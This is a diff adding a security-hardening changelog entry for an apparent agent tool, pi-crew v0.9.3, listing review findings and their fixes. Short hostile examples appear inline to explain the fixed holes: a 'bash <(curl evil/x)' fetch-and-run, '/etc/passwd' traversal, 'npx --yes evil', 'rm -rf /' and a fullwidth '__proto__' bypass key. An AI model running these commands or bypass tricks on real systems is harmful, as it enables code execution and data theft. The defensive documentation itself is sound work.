@@ -1,5 +1,98 @@
 # Changelog
 
+## [v0.9.3] — security hardening + crash-diagnostics (code review 2026-06-23)
+
+Patch release addressing findings from a full codebase code review
+(`research-findings/pi-crew-code-review-2026-06-23.md`), plus observability fixes
+for silent background-runner deaths.
+
+### Critical
+
+- **C-1** `worktree/branch-freshness.ts`: the `git()` helper spawned git with the
+  full parent env, leaking every API key/token to any git hook/alias/credential-
+  helper. Now uses `sanitizeEnvSecrets()` (mirrors `worktree-manager.ts`).
+
+### High
+
+- **H-1** `tools/safe-bash.ts`: `isDangerous()` missed Bash process substitution
+  `<(...)`/`>(...)`, which executes commands in a subshell bypassing all pipe-
+  based checks (e.g. `bash <(curl evil/x)`). Now blocked.
+- **H-2** `runtime/cross-extension-rpc.ts`: RPC authorization relied on a
+  self-declared `source === "pi-crew"` field any co-installed extension could
+  spoof. Now also requires an unguessable per-process token (`getCrewRpcToken()`).
+- **H-3** `extension/team-tool/run.ts`: result/summary artifact reads used a
+  `path.isAbsolute()` shortcut + bare `path.join`, allowing arbitrary file read
+  (`/etc/passwd`) and `../` traversal. Now routed through `resolveRealContainedPath()`.
+- **H-4** `ui/live-conversation-overlay.ts`: `cachedLines` grew unbounded during
+  long live sessions (OOM). Now capped at 5000 lines (ring buffer).
+- **H-6** `runtime/orphan-worker-registry.ts`: `pid` was interpolated into an
+  `execSync` shell string with no runtime assertion (command injection via a
+  poisoned state file). Now `Number.isFinite()`-guarded + `execFileSync` argv.
+- **H-7** `benchmark/benchmark-runner.ts`: the command allowlist permitted `npx`/
+  `node`, enabling arbitrary code execution without metacharacters
+  (`npx --yes evil`, `node -e …`). Removed; use `npm test`/`cargo test`.
+
+### Medium
+
+- **M-1** `runtime/post-checks.ts`, `runtime/task-runner.ts`: hand-rolled
+  `path.resolve + startsWith` containment was vulnerable to symlink traversal;
+  replaced with `resolveRealContainedPath()`.
+- **M-2** `workflows/intermediate-store.ts`: `phase`/`stepId` were interpolated
+  into a filename via `path.join` with no validation (path traversal via a
+  poisoned stepId). Now validated with `isSafePathId()`.
+- **M-3/M-4** `runtime/verification-gates.ts`: the dangerous-shell regex allowed
+  bare `>` file redirects and used a confusing `[^^&]` char class. Replaced with
+  a `[<>](?![&\d])` lookahead that blocks file redirects while allowing
+  `2>&1`/`>&N` fd-duplication.
+- **M-5** `tools/safe-bash.ts`: the overly-permissive-`allowPatterns` rejection
+  only caught patterns matching both `""` and `"rm -rf /"`; a pattern like `/.+/`
+  bypassed it. Now tests each pattern against a battery of dangerous commands.
+  (`safeRead` removed from the `permissive` preset — it allowed `cat` of any file.)
+- **M-7** `config/config.ts`: the `PI_TEAMS_HOME` containment check was bypassed
+  whenever `NODE_ENV=test`, reachable from staging/CI environments. The explicit
+  `PI_CREW_SKIP_HOME_CHECK=1` flag is now the only opt-out (test runner sets it).
+- **M-8** `hooks/registry.ts`: the prototype-pollution key lookup omitted
+  `.normalize("NFKC")`, so fullwidth-confusable keys (e.g. `__ｐroto__`, U+FF4F)
+  bypassed sanitization. Now normalized in both lookups.
+- **M-9** `runtime/verification-gates.ts`: the command-timeout `setTimeout` was
+  never stored/cleared, keeping the event loop alive for the full timeout and
+  firing `kill()` on an already-dead process. Now stored, `unref()`'d, and
+  cleared on close/error.
+- **M-10** `ui/live-run-sidebar.ts`: `dispose()` did not clear `autoCloseTimeout`,
+  so a disposed sidebar could fire `done()` later. Now cleared.
+- **M-11** `ui/settings-overlay.ts`: local width/truncate helpers counted
+  characters naively (broke CJK/emoji alignment). Now delegate to the
+  Unicode-aware `utils/visual.ts`.
+- **M-13** `ui/tool-renderers/index.ts`: removed dead `linkPath()` that
+  interpolated a path into an OSC-8 escape without sanitizing control chars.
+
+### Crash diagnostics (background runner)
+
+Three observability fixes so silent background-runner deaths leave a trace
+(root-caused a memory-pressure OOM/abort that previously vanished without a log):
+
+- **async-runner.ts**: drain the child stderr pipe into `background.log` instead
+  of destroying it (native abort/segfault messages were being swallowed). Buffer
+  capped at 256 KB.
+- **async-runner.ts**: V8 `--report-on-fatalerror` is now ON by default (writes a
+  report file into the run stateRoot); opt out with `PI_CREW_BG_REPORT_ON_FATAL=0`.
+- **background-runner.ts**: documented why the console redirect alone cannot
+  catch native crashes.
+
+### Tests
+
+- Regression tests added for H-1 (process substitution) and M-8 (NFKC-confusable
+  prototype pollution).
+- `getBackgroundRunnerCommand` tests updated for the new default report flags.
+- Benchmark test fixtures migrated off `npx`/`node` (now `grep --help`).
+
+### Not addressed in this release
+
+- **H-5** (transcript-viewer redundant disk I/O) — performance, deferred.
+- **H-8** (live-control injection) — pair with full event-bus origin signing.
+- **M-6** (per-child API-key scoping) — architectural; tracked separately.
+- **M-12/M-14** (widget dedup, shared elapsed helper) — maintainability, deferred.
+
 ## [v0.9.2] — package cleanup: remove scratch scripts leaked into npm tarball (2026-06-22)
 
 Patch release. **No code changes.** Purely a published-package hygiene fix.
